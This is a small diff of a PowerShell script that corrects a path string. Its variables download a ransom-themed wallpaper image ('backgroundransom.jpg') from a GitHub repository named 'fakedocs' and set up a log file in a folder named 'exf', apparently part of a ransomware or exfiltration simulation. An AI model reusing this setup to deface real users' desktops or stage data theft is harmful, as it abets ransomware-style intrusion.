@@ -1,5 +1,5 @@
 $url = "https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg";
-$imgLocation = "$env:UserProfile\\AppData\\Local\\wallpaper.jpg";
+$imgLocation = "$env:UserProfile\AppData\Local\wallpaper.jpg";
 $Exf_File = "$env:PUBLIC\exf\Download_back.log";
 
 add-type @"
